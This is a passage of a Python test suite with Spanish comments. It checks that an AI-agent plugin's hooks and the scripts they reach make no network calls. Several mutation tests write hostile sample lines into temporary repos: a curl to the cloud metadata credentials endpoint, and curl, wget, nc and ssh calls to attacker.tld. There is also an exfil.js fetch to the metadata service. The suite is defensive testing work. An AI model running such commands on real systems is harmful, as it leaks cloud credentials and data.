        candidato = os.path.normpath(os.path.join(base, relativa))
        if candidato.startswith(raiz + os.sep) and os.path.isfile(candidato):
            return candidato
    if citante and "/" not in relativa:
        clave = (os.path.relpath(citante, root).replace(os.sep, "/"), relativa)
        destino = _CITAS_POR_NOMBRE.get(clave)
        if destino and os.path.isfile(os.path.join(root, destino)):
            return os.path.normpath(os.path.join(root, destino))
    return None


def _valor_de_variable_shell(texto, variable):
    """Parte literal (tras la ultima expansion) de la PRIMERA asignacion `VAR=…` de un `.sh`:
    `SHARED="${CLAUDE_PLUGIN_ROOT:-}/agent-kits/shared"` -> `/agent-kits/shared`. `None` si la
    variable no se asigna en el fichero."""
    m = re.search(r"^[ \t]*(?:export[ \t]+)?%s=(?P<valor>.*)$" % re.escape(variable), texto, re.M)
    if not m:
        return None
    valor = _sin_comentario_shell(m.group("valor")).strip().strip("\"'")
    return _parte_literal(valor)


def _resolver_cita_de_codigo(m, ruta_citante, texto_citante, root):
    """Resuelve una cita encontrada por `_RUTA_RE` en el codigo de `ruta_citante`."""
    variable, ruta = m.group("var"), m.group("ruta")
    if variable in _VARIABLES_DE_RAIZ:
        return _resolver(ruta, root)
    if variable:
        prefijo = (_valor_de_variable_shell(texto_citante, variable)
                   if ruta_citante.endswith(".sh") else None)
        return _resolver(prefijo.rstrip("/") + "/" + ruta.lstrip("/"), root) if prefijo else None
    return _resolver(ruta, root, citante=ruta_citante)


def _es_no_escaneable(cita):
    # Only the known launcher is scanned as JavaScript; other JS remains fail-closed.
    if _parte_literal(cita).lstrip("/") == "hooks/run-hook.mjs":
        return False
    return cita.rsplit(".", 1)[-1].lower() in _EXT_NO_ESCANEABLES


def _parte_literal(token):
    """Parte VERIFICABLE de una cita: lo que queda tras la ULTIMA expansion de variable.
    `${CLAUDE_PLUGIN_ROOT}/hooks/session-context.sh` -> `/hooks/session-context.sh` (resuelve);
    `$SHARED/${BASE}.py` -> `.py` (no resuelve: una cita compuesta con variables no se puede
    verificar estaticamente y, desde el gap #155, es un FALLO, no un descarte silencioso)."""
    trozos = list(_EXPANSION_SHELL_RE.finditer(token))
    return token[trozos[-1].end():] if trozos else token


def _citas_de_cadena(texto):
    """Citas a `.py`/`.sh` que aparecen en una cadena de shell, en su forma ORIGINAL (para poder
    decir en el fallo que la cita venia compuesta por variables)."""
    return {m.group(0) for m in _TOKEN_SCRIPT_RE.finditer(texto)}


def _bloque_hooks_frontmatter(texto):
    """Bloque `hooks:` del frontmatter YAML de un agente (ADR-007), hasta la siguiente clave de
    primer nivel. `None` si el agente no declara hooks."""
    texto = texto.replace(chr(13) + chr(10), chr(10))   # el repo usa CRLF: sin esto no casa
    m = re.search(r"^hooks:[ \t]*\n(?P<bloque>(?:[ \t].*\n|\n)*)", texto, re.M)
    return m.group("bloque") if m else None


def _cadenas_inline(root=ROOT):
    """[(origen, cadena)] con TODO lo que arranca un hook SIN pasar por un fichero del repo: las
    cadenas `command`/`args` de `hooks/hooks.json` y las del bloque `hooks:` del frontmatter de
    cada `agents/*.md` (ADR-007: el guardarrail del implementer/architect vive ahi, no en
    `hooks.json`). El gap #155 las tenia fuera del recorrido -solo se miraban los ficheros a los
    que resolvian-, asi que un `curl` o un `--intent` escritos ALLI MISMO pasaban en vacio."""
    cadenas = []
    ruta_json = os.path.join(root, "hooks", "hooks.json")
    if os.path.isfile(ruta_json):
        with open(ruta_json, encoding="utf-8") as f:
            config = json.load(f)
        for evento, eventos in sorted((config.get("hooks") or {}).items()):
            for bloque in eventos:
                for hook in bloque.get("hooks") or []:
                    # gap #183: el comentario final no es parte de lo que se ejecuta
                    cadenas.append(("hooks/hooks.json %s command" % evento,
                                    _sin_comentario_shell(str(hook.get("command", ""))) + " " +
                                    " ".join(str(arg) for arg in hook.get("args") or [])))
    base_agentes = os.path.join(root, "agents")
    if os.path.isdir(base_agentes):
        for nombre in sorted(os.listdir(base_agentes)):
            if not nombre.endswith(".md"):
                continue
            bloque = _bloque_hooks_frontmatter(_texto(os.path.join(base_agentes, nombre)))
            if not bloque:
                continue
            for numero, linea in enumerate(bloque.splitlines(), 1):
                linea = _sin_comentario_shell(linea)
                if linea.strip():
                    cadenas.append(("agents/%s hooks: L%d" % (nombre, numero), linea))
    return cadenas


def _recorrido_hooks(root=ROOT):
    """Cierre TRANSITIVO (hasta `_MAX_SALTOS`) de lo que los hooks alcanzan, partiendo de las dos
    fuentes reales (`hooks.json` Y los frontmatter `hooks:`). Devuelve
    `({etiqueta relativa: ruta absoluta}, [(origen, cita) de las citas que NO resuelven])`."""
    pendientes, sin_resolver = set(), []
    for origen, cadena in _cadenas_inline(root):
        usa_launcher = "hooks/run-hook.mjs" in cadena or hashlib.sha256(
            cadena.strip().encode("utf8")).hexdigest() in _BOOTSTRAP_NODE_HASHES
        for cita in sorted(_citas_de_cadena(cadena)):
            variables = [re.match(r"\$\{?(\w+)", expansion).group(1)
                         for expansion in _EXPANSION_SHELL_RE.findall(cita)]
            if any(variable not in _VARIABLES_DE_RAIZ for variable in variables):
                sin_resolver.append((origen, cita))
                continue
            if cita == "run-hook.mjs" and usa_launcher:
                cita = "hooks/run-hook.mjs"
            if _es_no_escaneable(cita):   # gap #177: nada que la puerta sepa escanear
                if cita not in _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS:
                    sin_resolver.append((origen, cita))
                continue
            launcher = os.path.join(root, "hooks", "run-hook.mjs") if usa_launcher else None
            resuelta = _resolver(_parte_literal(cita), root, citante=launcher)
            if resuelta:
                pendientes.add(resuelta)
            elif cita not in _CITAS_SIN_FICHERO_PERMITIDAS:
                sin_resolver.append((origen, cita))
    vistos = {}
    for _salto in range(_MAX_SALTOS):
        siguientes = set()
        for resuelta in sorted(pendientes):
            etiqueta = os.path.relpath(resuelta, root).replace(os.sep, "/")
            if etiqueta in vistos:
                continue
            vistos[etiqueta] = resuelta
            # No basename fallback or dynamic module adoption: every edge is nominal.
            declared = _CARGAS_LOCALES_REVISADAS.get(etiqueta)
            if declared:
                raw = _texto(resuelta).replace("\r\n", "\n")
                if hashlib.sha256(raw.encode("utf8")).hexdigest() != declared["sha256_lf"]:
                    sin_resolver.append((etiqueta, "cargas locales no revisadas"))
                else:
                    for relative in declared["dependencies"]:
                        destination = _resolver(relative, root)
                        if destination:
                            siguientes.add(destination)
                        else:
                            sin_resolver.append((etiqueta, relative))
            codigo = _codigo(resuelta)
            if etiqueta == "hooks/run-hook.mjs":
                codigo = re.sub(r"(?m)^\s*//.*$", "", codigo)
            for m in sorted(_RUTA_RE.finditer(codigo), key=lambda x: x.group(0)):
                cita = m.group(0)
                if _es_no_escaneable(cita):
                    if cita not in _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS:
                        sin_resolver.append((etiqueta, cita))
                    continue
                destino = _resolver_cita_de_codigo(m, resuelta, codigo, root)
                if destino:
                    siguientes.add(destino)
                elif cita not in _CITAS_SIN_FICHERO_PERMITIDAS:
                    sin_resolver.append((etiqueta, cita))
        pendientes = siguientes
        if not pendientes:
            break
    return vistos, sin_resolver


def _fuentes_ejecutables(root=ROOT):
    """[(etiqueta, texto, ruta_o_None)] de TODO lo que un hook ejecuta: las cadenas inline (que no
    tienen fichero detras) y el CODIGO de cada script alcanzable."""
    fuentes = [(origen, cadena, None) for origen, cadena in _cadenas_inline(root)]
    alcanzables, _ = _recorrido_hooks(root)
    fuentes += [(etiqueta, _codigo(ruta), ruta) for etiqueta, ruta in sorted(alcanzables.items())]
    return fuentes


def _egress_por_js(texto):
    """The nominal launcher only imports four local Node builtins; unknown imports fail closed."""
    motivos = []
    modules = re.findall(r"\b(?:from|import)\s*['\"]([^'\"]+)['\"]", texto)
    for args in re.findall(r"\b(?:require|import)\s*\(([^)]*)\)", texto):
        try:
            module = ast.literal_eval(args.strip())
            if not isinstance(module, str):
                raise ValueError("not a literal module")
            modules.append(module)
        except (ValueError, SyntaxError):
            motivos.append("import JavaScript no literal")
    for module in modules:
        if module.removeprefix("node:") not in {"child_process", "fs", "path", "url"}:
            motivos.append("import JavaScript " + module)
    if re.search(r"\b(?:fetch|WebSocket)\s*\(", texto):
        motivos.append("JavaScript fetch/WebSocket")
    for command in re.findall(r"\b(?:spawn|spawnSync|exec|execSync|execFile|execFileSync)\s*\(\s*['\"]([^'\"]+)['\"]", texto):
        if command.split() and _binario(command.split()[0]) in _BINARIOS_DE_EGRESS:
            motivos.append("argv JavaScript " + command.split()[0])
    return motivos


def _ofensores_de_red(root=ROOT, excepciones=None):
    """`[(etiqueta, motivo)]` de todo lo que un hook alcanza y toca la red. `excepciones` (por
    defecto `_EGRESS_OPT_IN_DECLARADO`) retira SOLO los motivos declarados del fichero declarado, y
    solo si su condicion se sostiene (`excepciones={}` devuelve el crudo del detector)."""
    excepciones = _EGRESS_OPT_IN_DECLARADO if excepciones is None else excepciones
    ofensores = []
    for etiqueta, texto, ruta in _fuentes_ejecutables(root):
        texto = _codigo_red_python(ruta, texto)
        bajo = texto.lower()
        propios = []
        for termino in _TERMINOS_RED:
            if termino in bajo:
                propios.append(termino)
        modulos = _modulos_importados(ruta) if ruta else set()
        propios += ["import " + modulo for modulo in sorted(modulos & _MODULOS_RED)]
        if _IMPORT_NO_LITERAL in modulos:
            propios.append("import dinamico no literal")
        if ruta is None:                  # cadena inline: ademas, binarios de red como TOKEN
            propios += [t for t in _tokens_de_shell(bajo) if t in _BINARIOS_DE_RED]
        else:                             # gap #173: argv/shell/exec/claude en el AST del codigo
            propios += sorted(set(_egress_por_ast(ruta)))
            if etiqueta == "hooks/run-hook.mjs":
                raw = _texto(ruta).replace("\r\n", "\n")
                if hashlib.sha256(raw.encode("utf8")).hexdigest() != _LAUNCHER_NODE_HASH:
                    propios.append("launcher JavaScript no revisado")
                propios += _egress_por_js(texto)
        declarada = excepciones.get(etiqueta)
        if declarada and ruta and not _egress_del_journal_sin_condicion(_texto(ruta)):
            propios = [m for m in propios if m not in declarada["motivos"]]
        ofensores += [(etiqueta, m) for m in propios]
    return ofensores


def _ofensores_de_scripts_con_red(root=ROOT):
    ofensores = []
    for etiqueta, texto, ruta in _fuentes_ejecutables(root):
        for prohibido in _SCRIPTS_CON_RED:
            if prohibido in texto and (ruta is None or os.path.basename(ruta) != prohibido):
                ofensores.append((etiqueta, prohibido))
    return ofensores


def _ofensores_de_flags_de_adaptador(root=ROOT):
    ofensores = []
    for etiqueta, texto, ruta in _fuentes_ejecutables(root):
        if ruta is not None and os.path.basename(ruta) in _HERRAMIENTAS:
            continue                      # la herramienta DECLARA el flag; no se lo pasa a nadie
        for flag in _FLAGS_QUE_CARGAN_ADAPTADOR:
            if flag in texto:
                ofensores.append((etiqueta, flag))
    return ofensores


def test_el_recorrido_alcanza_de_verdad_los_scripts_de_los_hooks():
    """Andamiaje del resto de la seccion: si el recorrido dejara de encontrar los scripts reales,
    los tests de abajo pasarian EN VACIO (el fallo mas peligroso de un escaneo). Gap #155: exige
    tambien los hooks del FRONTMATTER (ADR-007) y su cierre transitivo (`guardrail-check.py`),
    que antes quedaban fuera del recorrido."""
    alcanzables, _ = _recorrido_hooks()
    for esperado in ("hooks/session-context.sh", "hooks/session-journal.sh",
                     "agent-kits/shared/journal.py", "agent-kits/shared/outbox.py",
                     "agent-kits/shared/knowledge-find.py", "agent-kits/shared/skill-index.py",
                     # hooks declarados en el frontmatter de un agente, no en `hooks.json`
                     "hooks/implementer-guardrail.sh", "hooks/architect-guardrail.sh",
                     "agent-kits/shared/guardrail-check.py"):
        assert esperado in alcanzables, (esperado, sorted(alcanzables))
    assert len(alcanzables) >= 8, sorted(alcanzables)
    origenes = {o.split(" ")[0] for o, _ in _cadenas_inline()}
    assert "hooks/hooks.json" in origenes and "agents/implementer.md" in origenes, sorted(origenes)


def test_toda_cita_de_script_desde_un_hook_resuelve_a_un_fichero_real():
    """Gap #155: una cita que no resolvia se descartaba EN SILENCIO (`continue`), asi que un hook
    que invocase su script por VARIABLE (`python3 "$SHARED/${BASE}.py"`) era invisible para toda
    la seccion. Ahora es un fallo: o la cita se puede verificar, o esta en la lista blanca."""
    _alcanzables, sin_resolver = _recorrido_hooks()
    assert sin_resolver == [], sin_resolver


def test_t10_combined_hook_dependencies_are_scanned_for_egress(tmp_path):
    files = {"hooks/ledger-post.py": _texto(os.path.join(ROOT, "hooks", "ledger-post.py"))}
    for name in ("ledger-lint.py", "progress-report.py", "local-read.py", "local-state.py", "redact.py"):
        files["agent-kits/shared/" + name] = "pass\n"
    files["agent-kits/shared/redact.py"] = "import socket\n"
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("hooks/ledger-post.py"), ficheros=files)
    assert ("agent-kits/shared/redact.py", "import socket") in _ofensores_de_red(root)


def test_t10_unreviewed_combined_loader_change_fails_closed(tmp_path):
    files = {"hooks/ledger-post.py": _texto(os.path.join(ROOT, "hooks", "ledger-post.py")) + "\n# Unreviewed owner change\n"}
    for name in ("ledger-lint.py", "progress-report.py", "local-read.py", "local-state.py", "redact.py"):
        files["agent-kits/shared/" + name] = "pass\n"
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("hooks/ledger-post.py"), ficheros=files)
    _reachable, unresolved = _recorrido_hooks(root)
    assert ("hooks/ledger-post.py", "cargas locales no revisadas") in unresolved


def test_t12_context_dependencies_are_scanned_for_egress(tmp_path):
    files = {"hooks/session-context.py": _texto(os.path.join(ROOT, "hooks", "session-context.py"))}
    for name in ("journal.py", "skill-index.py", "progress-report.py", "knowledge-find.py"):
        files["agent-kits/shared/" + name] = "pass\n"
    files["agent-kits/shared/knowledge-find.py"] = "import socket\n"
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("hooks/session-context.py"), ficheros=files)
    assert ("agent-kits/shared/knowledge-find.py", "import socket") in _ofensores_de_red(root)


def test_t12_unreviewed_context_loader_change_fails_closed(tmp_path):
    files = {"hooks/session-context.py": _texto(os.path.join(ROOT, "hooks", "session-context.py")) + "\n# Unreviewed owner change\n"}
    for name in ("journal.py", "skill-index.py", "progress-report.py", "knowledge-find.py"):
        files["agent-kits/shared/" + name] = "pass\n"
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("hooks/session-context.py"), ficheros=files)
    _reachable, unresolved = _recorrido_hooks(root)
    assert ("hooks/session-context.py", "cargas locales no revisadas") in unresolved


def test_ningun_script_alcanzable_desde_hooks_toca_la_red():
    """«Llamadas de red en hooks» esta FUERA DE ALCANCE (spec.md). Se mira el CODIGO (sin
    comentarios ni docstrings) de todo el cierre transitivo Y las cadenas inline que arrancan los
    hooks (gap #155: un `curl http://169.254.169.254/...` escrito en el propio `hooks.json` o en
    el frontmatter de un agente no pasa por ningun fichero)."""
    assert _ofensores_de_red() == [], _ofensores_de_red()


def test_ningun_script_alcanzable_desde_hooks_invoca_el_sincronizador_ni_capabilities():
    """`knowledge-sync.py` y `capabilities.py` son caminos que cargan un adaptador de backend
    (codigo CON capacidad de red): ningun hook puede llegar a ellos, ni por fichero ni inline."""
    assert _ofensores_de_scripts_con_red() == [], _ofensores_de_scripts_con_red()


def test_ningun_hook_pasa_intent_ni_backends_dir_a_knowledge_find():
    """`--intent`/`--backends-dir` son los UNICOS flags de `knowledge-find.py` que cargan un
    adaptador (CA-12): ningun llamador alcanzable desde los hooks los usa, tampoco en la cadena
    `command` del propio `hooks.json` ni en el frontmatter de un agente (gap #155)."""
    assert _ofensores_de_flags_de_adaptador() == [], _ofensores_de_flags_de_adaptador()


# --------------------------------------------------------- mutantes de la puerta (gap #155)
# Cada mutante reproduce una de las tres formas en las que la puerta pasaba en vacio, sobre un repo
# MINIMO en `tmp_path` (jamas sobre el arbol real).

def _repo_minimo(tmp_path, hooks_json=None, agente=None, ficheros=None):
    """Repo de mentira con la forma que el recorrido necesita: `hooks/hooks.json`, `agents/*.md`
    con su frontmatter y los scripts que se citen."""
    root = os.path.join(str(tmp_path), "repo-mutante")
    _escribir(os.path.join(root, "hooks", "hooks.json"),
              json.dumps(hooks_json if hooks_json is not None else {"hooks": {}}))
    os.makedirs(os.path.join(root, "agents"), exist_ok=True)
    # `_escribir` abre en modo texto: en Windows traduce y un contenido que YA venia con CRLF
    # (todo fichero del repo) acabaria con un retorno de carro duplicado, que ningun parser
    # reconoce.
    _lf = lambda c: c.replace(chr(13) + chr(10), chr(10))
    if agente:
        _escribir(os.path.join(root, "agents", "implementer.md"), _lf(agente))
        if "run-hook.mjs" in agente:
            _escribir(os.path.join(root, "hooks", "run-hook.mjs"),
                      _lf(_texto(os.path.join(ROOT, "hooks", "run-hook.mjs"))))
    for rel, contenido in (ficheros or {}).items():
        _escribir(os.path.join(root, *rel.split("/")), _lf(contenido))
    return root


def _hooks_json_con(comando):
    return {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": comando}]}]}}


def test_mutante_h6_un_hook_que_pasa_intent_inline_no_pasa_la_puerta(tmp_path):
    """Mutante H6: `hooks.json` invoca `knowledge-find.py --intent relacional` en la propia cadena
    `command` (el flag que carga un adaptador con red). Con el escaneo anterior: 23 passed."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'python3 "${CLAUDE_PLUGIN_ROOT}/agent-kits/shared/knowledge-find.py" --intent relacional'),
        ficheros={"agent-kits/shared/knowledge-find.py": "import os\n"})
    assert _ofensores_de_flags_de_adaptador(root), "el mutante H6 sobrevive"


def test_mutante_h7_un_hook_que_hace_curl_al_imds_no_pasa_la_puerta(tmp_path):
    """Mutante H7: `hooks.json` con un `curl` al IMDS de nube escrito inline (sin fichero de por
    medio). Con el escaneo anterior: 23 passed."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
    assert _ofensores_de_red(root), "el mutante H7 sobrevive"


def test_mutante_una_cita_por_variable_no_se_descarta_en_silencio(tmp_path):
    """Mutante: el hook compone la ruta de su script con variables (`python3 "$SHARED/${BASE}.py"`),
    que `_RUTA_RE` no ve, y el fichero real hace `urlopen` al IMDS. Con el escaneo anterior los
    cuatro tests de la seccion PASABAN."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'SHARED="${CLAUDE_PLUGIN_ROOT}/agent-kits/shared"; BASE=net-probe; python3 "$SHARED/${BASE}.py"'),
        ficheros={"agent-kits/shared/net-probe.py":
                  "import urllib.request\nurllib.request.urlopen('http://169.254.169.254/')\n"})
    alcanzables, sin_resolver = _recorrido_hooks(root)
    assert sin_resolver, "la cita por variable se sigue descartando en silencio"
    assert "net-probe.py" not in str(sorted(alcanzables)), sorted(alcanzables)


def test_mutante_urllib_en_un_hook_del_frontmatter_no_pasa_la_puerta(tmp_path):
    """Mutante: `guardrail-check.py` -alcanzable SOLO desde el frontmatter `hooks:` del
    implementer (ADR-007)- importa `urllib.request`. Antes 4 tests PASABAN porque el frontmatter
    no formaba parte del recorrido. Se usan los ficheros REALES del repo, copiados y mutados."""
    root = _repo_minimo(
        tmp_path,
        agente=_texto(os.path.join(ROOT, "agents", "implementer.md")),
        ficheros={"hooks/implementer-guardrail.sh":
                      _texto(os.path.join(ROOT, "hooks", "implementer-guardrail.sh")),
                  "agent-kits/shared/guardrail-check.py":
                      "import urllib.request\n" + _texto(os.path.join(SHARED, "guardrail-check.py"))})
    alcanzables, _ = _recorrido_hooks(root)
    assert "agent-kits/shared/guardrail-check.py" in alcanzables, sorted(alcanzables)
    assert any("guardrail-check.py" in etiqueta for etiqueta, _t in _ofensores_de_red(root)), \
        "el mutante `urllib` en un hook del frontmatter sobrevive"


# ------------------------------------------------------- mutantes de la puerta (fix2 Fase 4)
# Gaps #173, #176, #177, #182 y #183: cada test reproduce la evasion (o el falso positivo) que
# encontro la revision intento 2, sobre un repo MINIMO en `tmp_path` (jamas sobre el arbol real).

def _hook_que_lanza(ruta_script):
    return _hooks_json_con('python3 "${CLAUDE_PLUGIN_ROOT}/%s"' % ruta_script)


def test_f4fix2_mutante_e4a_subprocess_run_con_curl_en_lista_no_pasa_la_puerta(tmp_path):
    """Gap #173, mutante E4a: un script alcanzable hace `subprocess.run(["curl", "-s", URL])`.
    En forma de LISTA no queda la subcadena `"curl "` tras `ast.unparse`, asi que el escaneo por
    subcadena lo dejaba pasar (fix1: 35 passed)."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  'import subprocess\n'
                                  'subprocess.run(["curl", "-s", "http://attacker.tld/x"])\n'})
    ofensores = _ofensores_de_red(root)
    assert any(e == "agent-kits/shared/net-probe.py" and "curl" in m for e, m in ofensores), \
        ("el mutante E4a sobrevive", ofensores)


def test_f4fix2_mutante_e4b_popen_con_wget_en_tupla_no_pasa_la_puerta(tmp_path):
    """Gap #173, mutante E4b: `subprocess.Popen(("wget", "-q", URL))` (tupla) y la variante
    `os.execv("/usr/bin/nc", ...)` (el binario por RUTA absoluta)."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  'import os, subprocess\n'
                                  'subprocess.Popen(("wget", "-q", "http://attacker.tld/x"))\n'
                                  'os.execv("/usr/bin/nc", ["nc", "attacker.tld", "80"])\n'})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
    assert any("wget" in m for m in motivos), ("el mutante E4b sobrevive", motivos)
    assert any(m.endswith(" nc") for m in motivos), ("`os.execv` con `nc` sobrevive", motivos)


def test_f4fix2_una_cadena_de_shell_pasada_a_subprocess_se_tokeniza(tmp_path):
    """Gap #173: `subprocess.run("echo x | ssh host", shell=True)` -el binario de red en mitad de
    una tuberia- no deja ninguna subcadena de `_TERMINOS_RED` (`ssh ` no esta en esa lista: daria
    falsos positivos en prosa)."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  'import subprocess\n'
                                  'subprocess.run("echo x | ssh attacker.tld", shell=True)\n'})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
    assert any(m.endswith(" ssh") for m in motivos), motivos


def test_f4fix2_el_cli_claude_p_desde_un_script_alcanzable_no_pasa_la_puerta(tmp_path):
    """Gap #173: `[exe, "-p", ...]` con `exe = shutil.which("claude")` es EGRESS (la sesion hija
    habla con la API). Fuera de la excepcion nominal del journal (test siguiente), cualquier script
    alcanzable que lo haga es un fallo: aqui, el MISMO codigo que `journal.py` en otro fichero."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/outbox.py"),
                        ficheros={"agent-kits/shared/outbox.py":
                                  'import shutil, subprocess\n'
                                  'exe = shutil.which("claude")\n'
                                  'cmd = [exe, "-p", "resume", "--bare"]\n'
                                  'subprocess.run(cmd)\n'})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/outbox.py"]
    assert "ejecutable claude" in motivos, motivos
    assert "argv <variable> -p" in motivos, motivos


def test_f4fix2_el_egress_del_journal_es_una_excepcion_nominal_y_condicionada():
    """Gap #173: `journal.py` (alcanzable desde `hooks/session-journal.sh`) lanza `claude -p
    --bare` para el resumen IA -egress OPT-IN real (ADR-010 revisado, ADR-013)-. No se esconde: el
    detector LO VE (sin excepciones sale), la excepcion es NOMINAL (este fichero y estos motivos,
    ninguno mas) y solo vale mientras el camino siga condicionado a `dev.json` `sesion.resumen:
    true` (`ia_activa`): es la conciliacion con «ninguna llamada de red desde hooks» que declara
    `design.md`."""
    crudos = _ofensores_de_red(ROOT, excepciones={})
    del_journal = sorted({m for e, m in crudos if e == "agent-kits/shared/journal.py"})
    assert del_journal, "el detector ya no ve el `claude -p` del journal: la excepcion esta en vacio"
    declarada = _EGRESS_OPT_IN_DECLARADO["agent-kits/shared/journal.py"]
    assert set(del_journal) <= set(declarada["motivos"]), del_journal
    assert "sesion.resumen" in declarada["condicion"], declarada
    assert sorted(_EGRESS_OPT_IN_DECLARADO) == ["agent-kits/shared/journal.py"]
    assert [o for o in crudos if o[0] != "agent-kits/shared/journal.py"] == [], crudos
    real = _texto(os.path.join(SHARED, "journal.py"))
    assert _egress_del_journal_sin_condicion(real) == [], _egress_del_journal_sin_condicion(real)


def test_f4fix2_mutante_journal_sin_la_condicion_sesion_resumen_rompe_la_excepcion():
    """Mutante del gap #173: la llamada a `resumen_ia` deja de depender de `ia_activa(root)`, o
    `ia_activa` deja de exigir `is True`. La excepcion nominal ya no se sostiene y la puerta lo
    dice (sobre el TEXTO mutado; el arbol real no se toca)."""
    real = _texto(os.path.join(SHARED, "journal.py"))
    sin_guardia = real.replace('ia == "auto" and ia_activa(root)', 'ia == "auto"')
    assert sin_guardia != real, "cambio la guardia de `escribir_sesion`: el mutante ya no aplica"
    assert _egress_del_journal_sin_condicion(sin_guardia), "el mutante sin guardia sobrevive"
    laxa = real.replace('get("resumen") is True', 'get("resumen")')
    assert laxa != real, "cambio `ia_activa`: el mutante ya no aplica"
    assert _egress_del_journal_sin_condicion(laxa), "el mutante `ia_activa` laxa sobrevive"


def _hooks_que_fuerzan_ia(root=ROOT):
    """Etiquetas de lo que un hook ejecuta y fuerza el resumen por IA del journal (`--ia on`)."""
    # gap #194 (fix3): por linea LOGICA (continuaciones con barra invertida unidas, `_unidades`
    # del #175), no por linea fisica: `journal.py`, barra final, salto y `--ia on` la esquivaba.
    return [etiqueta for etiqueta, texto, _ruta in _fuentes_ejecutables(root)
            if any(re.search(r"journal[.]py.*--ia[ =]+on", unidad)
                   for _n, unidad, _c, es_bloque in _unidades(texto) if not es_bloque)]


def test_f4fix2_una_copia_del_journal_sin_guardia_pierde_la_excepcion(tmp_path):
    """Gap #173, sobre una COPIA del repo: el `journal.py` REAL, alcanzable desde un hook, pasa la
    puerta; el mismo fichero con la llamada a `resumen_ia` sin la guardia `ia_activa(root)` ya no
    (la excepcion nominal exige su condicion, no solo el nombre del fichero). Ademas, ningun hook
    fuerza el camino con `--ia on`."""
    real = _texto(os.path.join(SHARED, "journal.py"))
    hook = _hook_que_lanza("agent-kits/shared/journal.py")
    for clave, texto, esperado in (
            ("real", real, False),
            ("sin-guardia", real.replace('ia == "auto" and ia_activa(root)', 'ia == "auto"'), True)):
        root = _repo_minimo(tmp_path / clave, hooks_json=hook,
                            ficheros={"agent-kits/shared/journal.py": texto,
                                      "agent-kits/shared/redact.py": "import re" + chr(10)})
        motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/journal.py"]
        assert bool([m for m in motivos if "claude" in m or "-p" in m]) is esperado, (clave, motivos)
    # nominal por FICHERO: el mismo codigo, guardia incluida, con otro nombre, no esta exento
    root = _repo_minimo(tmp_path / "otro-nombre", hooks_json=_hook_que_lanza("agent-kits/shared/outbox.py"),
                        ficheros={"agent-kits/shared/outbox.py": real,
                                  "agent-kits/shared/redact.py": "import re" + chr(10)})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/outbox.py"]
    assert "ejecutable claude" in motivos, motivos
    assert _hooks_que_fuerzan_ia() == [], _hooks_que_fuerzan_ia()


def test_f4fix2_mutante_e7_import_dinamico_de_socket_no_pasa_la_puerta(tmp_path):
    """Gap #176, mutantes E7a/E7b: `__import__("socket")` (literal: es un import) e
    `importlib.import_module("sock" + "et")` (no literal: FALLO, no se puede verificar)."""
    for clave, codigo, esperado in (
            ("e7a", '__import__("socket").create_connection\n', "import socket"),
            ("e7b", 'import importlib\nimportlib.import_module("sock" + "et")\n', "no literal")):
        root = _repo_minimo(tmp_path / clave,
                            hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                            ficheros={"agent-kits/shared/net-probe.py": codigo})
        motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
        assert any(esperado in m for m in motivos), (clave, motivos)


def test_f4fix2_import_module_literal_de_un_modulo_inocuo_no_es_ofensor(tmp_path):
    """Control negativo del #176: un `import_module("json")` literal es un import mas."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/ok.py"),
                        ficheros={"agent-kits/shared/ok.py":
                                  'import importlib\nimportlib.import_module("json")\n'})
    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)


def test_f4fix2_mutante_e8_un_hook_que_lanza_javascript_no_pasa_la_puerta(tmp_path):
    """Gap #177, mutante E8: `node "…/hooks/exfil.js"` (con `fetch` al IMDS dentro) no se
    recorria NI contaba como cita sin resolver. Toda cita a un ejecutable que la puerta no sabe
    escanear (`.js`/`.mjs`/`.ps1`/`.cmd`) es FALLO salvo lista blanca nominal (vacia)."""
    for script in ("hooks/exfil.js", "hooks/exfil.mjs", "hooks/exfil.ps1", "hooks/exfil.cmd"):
        root = _repo_minimo(tmp_path / script.rsplit(".", 1)[1],
                            hooks_json=_hooks_json_con('node "${CLAUDE_PLUGIN_ROOT}/%s"' % script),
                            ficheros={script: "fetch('http://169.254.169.254/latest/meta-data/')\n"})
        _alcanzables, sin_resolver = _recorrido_hooks(root)
        assert any(script.rsplit("/", 1)[1] in c for _o, c in sin_resolver), (script, sin_resolver)
    assert _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS == ()


def test_f4fix2_mutante_e8_un_script_alcanzable_que_cita_javascript_no_pasa(tmp_path):
    """Gap #177, forma transitiva de E8: el hook es un `.sh` inocente que lanza un `.js`."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'bash "${CLAUDE_PLUGIN_ROOT}/hooks/ok.sh"'),
        ficheros={"hooks/ok.sh": 'node "$(dirname "$0")/exfil.js"\n',
                  "hooks/exfil.js": "fetch('http://169.254.169.254/')\n"})
